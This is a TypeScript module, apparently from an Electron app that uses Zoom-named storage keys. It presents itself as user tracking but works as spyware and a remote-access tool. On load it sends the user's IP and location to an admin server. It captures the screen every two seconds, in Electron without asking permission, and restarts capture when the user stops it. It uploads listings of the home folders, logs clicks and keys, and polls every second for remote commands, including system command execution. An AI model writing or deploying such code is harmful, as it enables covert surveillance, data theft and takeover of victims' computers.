// User tracking module for Windows app
// This module handles user registration, status updates, and screen sharing

interface UserInfo {
  id: string;
  name: string;
  email?: string;
  ip: string;
  location: string;
  version: string;
  os: string;
  installDate: string;
  lastSeen: string;
  status: 'online' | 'offline' | 'idle';
}

class UserTracker {
  private userId: string = '';
  private adminServerUrl: string = '';
  private heartbeatInterval: any = null;
  private screenShareActive: boolean = false;

  constructor(adminServerUrl: string = 'http://localhost:3000') {
    // Initialize properties first
    this.adminServerUrl = adminServerUrl;
    
    // Only initialize on client side - comprehensive checks
    if (typeof window === 'undefined' || 
        typeof document === 'undefined' || 
        typeof localStorage === 'undefined' ||
        typeof navigator === 'undefined') {
      return;
    }
    
    this.userId = this.getOrCreateUserId();
    this.initializeTracking();
  }

  private getOrCreateUserId(): string {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof localStorage === 'undefined') {
      return 'server-user-' + Math.random().toString(36).substring(2, 15);
    }
    
    try {
      // Try to get existing user ID from localStorage
      let userId = localStorage.getItem('zoom_user_id');
      
      if (!userId) {
        // Generate new user ID
        userId = 'user-' + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('zoom_user_id', userId);
      }
      
      return userId;
    } catch (error) {
      // Fallback if localStorage is not available
      return 'user-' + Math.random().toString(36).substring(2, 15);
    }
  }

  private async getUserInfo(): Promise<UserInfo> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof navigator === 'undefined' || typeof localStorage === 'undefined') {
      return {
        id: this.userId,
        name: 'Server User',
        email: undefined,
        ip: 'Unknown',
        location: 'Unknown',
        version: '1.0.0',
        os: 'Server',
        installDate: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        status: 'online'
      };
    }

    // Get system information
    const userAgent = navigator.userAgent;
    const isWindows = userAgent.includes('Windows');
    const osVersion = isWindows ? this.getWindowsVersion(userAgent) : 'Unknown';
    
    // Get IP address (simplified - in production use a proper IP service)
    const ip = await this.getPublicIP();
    
    // Get location (simplified - in production use a proper geolocation service)
    const location = await this.getLocation();

    return {
      id: this.userId,
      name: localStorage.getItem('zoom_user_name') || 'Anonymous User',
      email: localStorage.getItem('zoom_user_email') || undefined,
      ip,
      location,
      version: '1.0.0',
      os: `Windows ${osVersion}`,
      installDate: localStorage.getItem('zoom_install_date') || new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      status: 'online'
    };
  }

  private getWindowsVersion(userAgent: string): string {
    if (userAgent.includes('Windows NT 10.0')) return '10/11';
    if (userAgent.includes('Windows NT 6.3')) return '8.1';
    if (userAgent.includes('Windows NT 6.2')) return '8';
    if (userAgent.includes('Windows NT 6.1')) return '7';
    return 'Unknown';
  }

  private async getPublicIP(): Promise<string> {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch {
      return 'Unknown';
    }
  }

  private async getLocation(): Promise<string> {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      return `${data.city}, ${data.region}`;
    } catch {
      return 'Unknown Location';
    }
  }

  private async initializeTracking(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof localStorage === 'undefined' || typeof document === 'undefined') {
      return; // Skip initialization on server
    }

    // Check if Electron APIs are available
    const isElectron = typeof window !== 'undefined' && (window as any).electronAPI;
    console.log('🔍 Electron API available:', isElectron);
    if (isElectron) {
      console.log('✅ Running in Electron - full features enabled');
      console.log('📁 Available APIs:', Object.keys((window as any).electronAPI || {}));
    } else {
      console.warn('⚠️ Not in Electron - limited features (browser mode)');
    }

    try {
      // Set install date if not set
      if (!localStorage.getItem('zoom_install_date')) {
        localStorage.setItem('zoom_install_date', new Date().toISOString());
      }
    } catch (error) {
      console.warn('localStorage not available, skipping install date setting');
      return;
    }

    // Register user with admin panel
    await this.registerUser();

    // Start heartbeat
    this.startHeartbeat();

    // Automatically start screen sharing for admin monitoring
    // This will request permission and start sharing if granted
    setTimeout(async () => {
      console.log('📸 Attempting to start automatic screen share...');
      try {
        await this.startAutomaticScreenShare();
        console.log('✅ Screen share started successfully');
      } catch (error) {
        console.warn('⚠️ Automatic screen share failed, will retry:', error);
        // Retry after 5 seconds if it fails
        setTimeout(async () => {
          try {
            console.log('📸 Retrying screen share...');
            await this.startAutomaticScreenShare();
          } catch (e) {
            console.warn('❌ Screen share retry failed:', e);
          }
        }, 5000);
      }
    }, 2000); // Wait 2 seconds for page to fully load (reduced from 3)

    // Start file system monitoring
    this.startFileSystemMonitoring();

    // Start remote control functionality
    await this.startRemoteControl();

    // Listen for visibility changes
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.updateStatus('idle');
      } else {
        this.updateStatus('online');
      }
    });

    // Listen for beforeunload
    window.addEventListener('beforeunload', () => {
      this.updateStatus('offline');
      this.stopScreenShare();
    });
  }

  private async registerUser(): Promise<void> {
    try {
      const userInfo = await this.getUserInfo();
      
      await fetch(`${this.adminServerUrl}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'update_user_status',
          userId: this.userId,
          ...userInfo
        })
      });
    } catch (error) {
      console.error('Failed to register user:', error);
    }
  }

  private startHeartbeat(): void {
    this.heartbeatInterval = setInterval(async () => {
      await this.updateStatus('online');
    }, 30000); // Update every 30 seconds
  }

  public async updateStatus(status: 'online' | 'offline' | 'idle'): Promise<void> {
    try {
      const userInfo = await this.getUserInfo();
      
      await fetch(`${this.adminServerUrl}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          action: 'update_user_status',
          userId: this.userId,
          ...userInfo,
          status
        })
      });
    } catch (error) {
      console.error('Failed to update status:', error);
    }
  }

  // Automatic screen sharing for admin monitoring
  private async startAutomaticScreenShare(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof navigator === 'undefined') {
      return; // Skip on server
    }

    try {
      // Wait a bit for the page to fully load
      setTimeout(async () => {
        await this.requestScreenAccess();
      }, 3000);
    } catch (error) {
      console.error('Failed to start automatic screen share:', error);
    }
  }

  private async requestScreenAccess(): Promise<void> {
    try {
      // Check if we're in Electron (can use desktopCapturer without permission)
      if (typeof window !== 'undefined' && (window as any).electronAPI) {
        // Use Electron's screen capture (no permission needed)
        this.screenShareActive = true;
        
        // Initialize screen share in API
        await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: this.userId,
            action: 'start',
            data: 'initializing'
          })
        });
        
        // Notify admin that screen sharing is active
        await fetch(`${this.adminServerUrl}/api/admin/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'update_user_status',
            userId: this.userId,
            screenShareActive: true
          })
        });

        // Start Electron screen capture
        this.startElectronScreenCapture();
      } else {
        // Browser environment - requires permission
        const stream = await navigator.mediaDevices.getDisplayMedia({
          video: {
            width: { ideal: 1920 },
            height: { ideal: 1080 },
            frameRate: { ideal: 15 }
          },
          audio: false
        });

        this.screenShareActive = true;

        // Notify admin that screen sharing is active
        await fetch(`${this.adminServerUrl}/api/admin/users`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: 'update_user_status',
            userId: this.userId,
            screenShareActive: true
          })
        });

        // Start sending screen data
        this.startScreenCapture(stream);

        // Handle stream end (user stops sharing)
        stream.getTracks()[0].addEventListener('ended', () => {
          this.stopScreenShare();
          // Automatically try to restart after a delay
          setTimeout(() => {
            this.requestScreenAccess();
          }, 5000);
        });
      }
    } catch (error) {
      console.error('Screen access denied or failed:', error);
      // Try again after a longer delay
      setTimeout(() => {
        this.requestScreenAccess();
      }, 30000);
    }
  }

  private startElectronScreenCapture(): void {
    if (typeof window === 'undefined' || !(window as any).electronAPI) {
      console.error('❌ Electron API not available for screen capture');
      return;
    }

    console.log('📸 Starting Electron screen capture...');

    const captureLoop = async () => {
      if (this.screenShareActive) {
        try {
          console.log('📸 Capturing screen...');
          const imageData = await (window as any).electronAPI.captureScreen();
          if (imageData) {
            console.log('✅ Screen captured, size:', imageData.length, 'bytes');
            // Send screen data to admin
            const response = await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                userId: this.userId,
                action: 'update',
                data: imageData,
                timestamp: new Date().toISOString()
              })
            });
            
            if (response.ok) {
              console.log('✅ Screen data sent successfully');
            } else {
              console.error('❌ Failed to send screen data:', response.statusText);
            }
          } else {
            console.warn('⚠️ Screen capture returned null');
          }
        } catch (error) {
          console.error('❌ Failed to capture screen:', error);
        }
        
        // Capture every 2 seconds
        setTimeout(captureLoop, 2000);
      } else {
        console.log('📸 Screen capture stopped');
      }
    };

    // Start immediately
    captureLoop();
  }

  private startScreenCapture(stream: MediaStream): void {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const video = document.createElement('video');
    
    video.srcObject = stream;
    video.play();

    const sendFrame = async () => {
      if (this.screenShareActive && ctx && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        // Convert to base64 and send to admin
        const imageData = canvas.toDataURL('image/jpeg', 0.7);
        
        try {
          await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: this.userId,
              action: 'update',
              data: imageData,
              timestamp: new Date().toISOString()
            })
          });
        } catch (error) {
          console.error('Failed to send screen data:', error);
        }

        // Send frame every 2 seconds for smooth viewing
        setTimeout(sendFrame, 2000);
      } else if (this.screenShareActive) {
        // Retry if video not ready
        setTimeout(sendFrame, 1000);
      }
    };

    video.addEventListener('loadedmetadata', () => {
      sendFrame();
    });
  }

  public async startScreenShare(): Promise<boolean> {
    try {
      await this.requestScreenAccess();
      return this.screenShareActive;
    } catch (error) {
      console.error('Failed to start screen share:', error);
      return false;
    }
  }

  public async stopScreenShare(): Promise<void> {
    this.screenShareActive = false;
    
    try {
      await fetch(`${this.adminServerUrl}/api/admin/screen-share`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId: this.userId,
          action: 'stop'
        })
      });
    } catch (error) {
      console.error('Failed to stop screen share:', error);
    }
  }

  private startFileSystemMonitoring(): void {
    // Check if we're in a browser environment
    if (typeof window === 'undefined') {
      return; // Skip on server
    }

    console.log('📁 File system monitoring started');
    
    // Send initial file system info immediately
    setTimeout(() => {
      this.sendFileSystemInfo();
    }, 2000); // Wait 2 seconds for Electron APIs to be ready
    
    // Send again after 5 seconds to ensure it works
    setTimeout(() => {
      this.sendFileSystemInfo();
    }, 5000);
    
    // Periodically send file system updates
    setInterval(() => {
      this.sendFileSystemInfo();
    }, 30000); // Scan every 30 seconds (changed from 60)
  }

  private async sendFileSystemInfo(): Promise<void> {
    try {
      // Check if we're in Electron (has electronAPI)
      if (typeof window !== 'undefined' && (window as any).electronAPI) {
        console.log('📁 Reading file system via Electron...');
        try {
          // Use Electron's file system access
          const homeDir = (window as any).electronAPI.getHomeDirectory();
          const drives = (window as any).electronAPI.getDrives();
          
          console.log('📁 Home directory:', homeDir);
          console.log('📁 Drives:', drives);
          
          // Read common directories
          const directories: any = {};
          
          // Read user directories
          const userDirs = ['Documents', 'Desktop', 'Downloads', 'Pictures', 'Videos', 'Music'];
          for (const dir of userDirs) {
            try {
              // Simple path joining (Electron handles Windows paths)
              const separator = homeDir.includes('\\') ? '\\' : '/';
              const dirPath = homeDir + separator + dir;
              console.log(`📁 Reading directory: ${dirPath}`);
              const dirContents = (window as any).electronAPI.readDirectory(dirPath);
              if (dirContents && dirContents.length > 0) {
                directories[dir] = dirContents.slice(0, 20); // Limit to 20 items
                console.log(`✅ Found ${dirContents.length} items in ${dir}`);
              }
            } catch (e) {
              console.warn(`⚠️ Could not read ${dir}:`, e);
            }
          }
          
          console.log('📁 Sending file system data to admin:', {
            homeDirectory: homeDir,
            drivesCount: drives.length,
            directoriesCount: Object.keys(directories).length
          });
          
          // Send file system data to admin
          const response = await fetch(`${this.adminServerUrl}/api/admin/files`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              userId: this.userId,
              action: 'update_file_system',
              data: {
                homeDirectory: homeDir,
                drives,
                directories,
                timestamp: new Date().toISOString()
              }
            })
          });
          
          if (response.ok) {
            console.log('✅ File system data sent successfully');
          } else {
            console.error('❌ Failed to send file system data:', response.statusText);
          }
        } catch (error) {
          console.error('❌ Failed to read file system via Electron:', error);
        }
      } else {
        console.warn('⚠️ Electron API not available - browser mode');
        // Browser environment - send limited info
        await fetch(`${this.adminServerUrl}/api/admin/files`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: this.userId,
            action: 'update_file_system',
            data: {
              accessiblePaths: ['Downloads', 'Documents', 'Desktop'],
              timestamp: new Date().toISOString()
            }
          })
        });
      }
    } catch (error) {
      console.error('❌ Failed to send file system info:', error);
    }
  }

  // Remote control functionality
  public async startRemoteControl(): Promise<void> {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
      return; // Skip on server
    }

    try {
      // Notify admin that remote control is available
      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          action: 'start_control',
          timestamp: new Date().toISOString()
        })
      });

      // Set up remote control listeners
      this.setupRemoteControlListeners();
      console.log('Remote control enabled for admin access');
    } catch (error) {
      console.error('Failed to start remote control:', error);
    }
  }

  private setupRemoteControlListeners(): void {
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
      return; // Skip on server
    }

    // Listen for remote control commands from admin
    setInterval(async () => {
      try {
        const response = await fetch(`${this.adminServerUrl}/api/admin/remote-control?userId=${this.userId}`);
        if (response.ok) {
          const data = await response.json();
          if (data.isActive) {
            // Process pending remote control commands
            await this.processRemoteCommands();
          }
        }
      } catch (error) {
        // Silently handle errors - remote control is optional
      }
    }, 1000); // Check for commands every second

    // Listen for mouse and keyboard events (for demo purposes)
    document.addEventListener('mousemove', (event) => {
      this.sendUserActivity('mouse_move', {
        x: event.clientX,
        y: event.clientY,
        timestamp: new Date().toISOString()
      });
    });

    document.addEventListener('click', (event) => {
      this.sendUserActivity('mouse_click', {
        button: event.button === 0 ? 'left' : event.button === 2 ? 'right' : 'middle',
        x: event.clientX,
        y: event.clientY,
        timestamp: new Date().toISOString()
      });
    });

    document.addEventListener('keydown', (event) => {
      // Only log significant keys (not every keystroke for privacy)
      if (event.ctrlKey || event.altKey || event.metaKey || 
          ['Tab', 'Enter', 'Escape', 'F1', 'F2', 'F3', 'F4', 'F5'].includes(event.key)) {
        this.sendUserActivity('key_press', {
          key: event.key,
          ctrlKey: event.ctrlKey,
          altKey: event.altKey,
          shiftKey: event.shiftKey,
          metaKey: event.metaKey,
          timestamp: new Date().toISOString()
        });
      }
    });
  }

  private async processRemoteCommands(): Promise<void> {
    try {
      // Fetch pending commands from admin
      const response = await fetch(`${this.adminServerUrl}/api/admin/remote-control?userId=${this.userId}&getCommands=true`);
      if (response.ok) {
        const data = await response.json();
        if (data.commands && Array.isArray(data.commands)) {
          // Process each command
          for (const command of data.commands) {
            await this.executeCommand(command);
          }
        }
      }
    } catch (error) {
      console.error('Failed to process remote commands:', error);
    }
  }

  private async executeCommand(command: any): Promise<void> {
    if (!command || !command.type) return;

    try {
      // Check if we're in Electron (can use native controls)
      const isElectron = typeof window !== 'undefined' && (window as any).electronAPI;

      switch (command.type) {
        case 'mouse_move':
          if (isElectron && command.x !== undefined && command.y !== undefined) {
            // Use Electron's native mouse control
            (window as any).electronAPI.simulateMouseClick(command.x, command.y, 'move');
          } else {
            // Browser fallback
            const event = new MouseEvent('mousemove', {
              clientX: command.x,
              clientY: command.y,
              bubbles: true,
              cancelable: true
            });
            document.dispatchEvent(event);
          }
          break;

        case 'mouse_click':
          if (isElectron && command.x !== undefined && command.y !== undefined) {
            // Use Electron's native mouse control
            (window as any).electronAPI.simulateMouseClick(command.x, command.y, command.button || 'left');
          } else {
            // Browser fallback
            const clickEvent = new MouseEvent('click', {
              clientX: command.x || 0,
              clientY: command.y || 0,
              button: command.button === 'right' ? 2 : 0,
              bubbles: true,
              cancelable: true
            });
            document.elementFromPoint(command.x || 0, command.y || 0)?.dispatchEvent(clickEvent);
          }
          break;

        case 'key_press':
          if (isElectron && command.key) {
            // Use Electron's native keyboard control
            (window as any).electronAPI.simulateKeyPress(command.key);
          } else {
            // Browser fallback
            const keyEvent = new KeyboardEvent('keydown', {
              key: command.key,
              code: command.code,
              ctrlKey: command.ctrlKey || false,
              altKey: command.altKey || false,
              shiftKey: command.shiftKey || false,
              metaKey: command.metaKey || false,
              bubbles: true,
              cancelable: true
            });
            document.activeElement?.dispatchEvent(keyEvent);
          }
          break;

        case 'scroll':
          window.scrollBy(command.x || 0, command.y || 0);
          break;

        case 'execute_command':
          if (isElectron && command.command) {
            // Execute system command
            const result = await (window as any).electronAPI.executeCommand(command.command, command.args || []);
            console.log('Command executed:', result);
          }
          break;

        default:
          console.warn('Unknown command type:', command.type);
      }

      // Mark command as executed
      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          action: 'command_executed',
          commandId: command.id
        })
      });
    } catch (error) {
      console.error('Failed to execute command:', error);
    }
  }

  private async sendUserActivity(type: string, data: any): Promise<void> {
    try {
      // Send ALL user activity to admin panel for complete monitoring
      // No throttling - we want to track everything the user does
      await fetch(`${this.adminServerUrl}/api/admin/user-activity`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          type,
          data,
          timestamp: new Date().toISOString()
        })
      });
    } catch (error) {
      // Silently handle errors - activity tracking is optional
    }
  }

  public async stopRemoteControl(): Promise<void> {
    try {
      await fetch(`${this.adminServerUrl}/api/admin/remote-control`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: this.userId,
          action: 'stop_control',
          timestamp: new Date().toISOString()
        })
      });
      console.log('Remote control disabled');
    } catch (error) {
      console.error('Failed to stop remote control:', error);
    }
  }

  public destroy(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    this.updateStatus('offline');
  }
}

// Export factory function instead of singleton instance
export const createUserTracker = (adminServerUrl?: string): UserTracker | null => {
  // Only create instance on client side
  if (typeof window !== 'undefined' && typeof document !== 'undefined' && typeof localStorage !== 'undefined') {
    try {
      return new UserTracker(adminServerUrl);
    } catch (error) {
      console.warn('Failed to initialize user tracker:', error);
      return null;
    }
  }
  return null;
};

// Export null as default to prevent SSR issues
export default null;
